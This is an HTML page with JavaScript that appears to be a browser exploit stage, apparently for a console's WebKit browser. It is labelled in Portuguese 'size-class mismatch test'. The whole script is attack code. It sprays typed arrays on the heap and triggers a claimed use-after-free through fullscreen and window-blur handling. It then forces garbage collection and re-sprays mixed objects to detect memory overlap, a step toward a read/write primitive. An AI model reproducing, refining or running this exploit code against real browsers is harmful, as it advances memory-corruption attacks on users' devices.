
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Phase-2 — Size Class Mismatch Test</title>
</head>
<body>
<pre id="log"></pre>
<button onclick="run()">EXECUTAR TESTE CAMINHO 2</button>

<script>
const log = s => document.getElementById("log").textContent += s + "\n";

function forceGC() {
    let t = [];
    for (let i = 0; i < 40000; i++)
        t.push(new ArrayBuffer(0x200));
    t = null;
}

function run() {
    log("=== CAMINHO 2: SIZE-CLASS MISMATCH ===");
    log("Aperte OPTIONS quando solicitado.");

    const PATTERN = 2.121995791e-314;
    let controllers = [];

    for (let i = 0; i < 7000; i++) {
        let ta = new Float64Array(8);   // ~64 bytes
        ta[0] = i;
        controllers.push(ta);
    }

    if (document.documentElement.webkitRequestFullscreen)
        document.documentElement.webkitRequestFullscreen();

    window.onblur = function () {
        log("[*] Janela de UAF aberta.");

        let sprayA = [];
        for (let i = 0; i < 10000; i++) {
            let t = new Float64Array(8);
            t.fill(PATTERN);
            sprayA.push(t);
        }

        let corrupted = null;
        for (let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }

        if (!corrupted) {
            log("[-] UAF não confirmado.");
            return;
        }

        log("[+] UAF CONFIRMADO.");

        const dv = new DataView(corrupted.buffer);
        dv.setUint32(0, 0xAAAAAAAA, true);

        // soltar tudo
        corrupted = null;
        controllers = null;
        sprayA = null;

        forceGC();
        log("[*] GC forçado.");

        // Reocupar com objetos DIFERENTES
        let victims = [];
        for (let i = 0; i < 12000; i++) {
            if (i % 3 === 0)
                victims.push(new Uint32Array(16));     // ~64 bytes
            else if (i % 3 === 1)
                victims.push(new ArrayBuffer(64));
            else
                victims.push(new DataView(new ArrayBuffer(64)));
        }

        log("[*] Spray heterogêneo concluído.");

        // Verificação cruzada
        for (let i = 0; i < victims.length; i++) {
            try {
                if (victims[i] instanceof Uint32Array) {
                    if (victims[i][0] === 0xAAAAAAAA) {
                        log("!!! SUCESSO: OVERLAP COM Uint32Array (index " + i + ")");
                        return;
                    }
                }
            } catch {}
        }

        log("[-] Nenhuma evidência de size-class overlap.");
    };
}
</script>
</body>
</html>
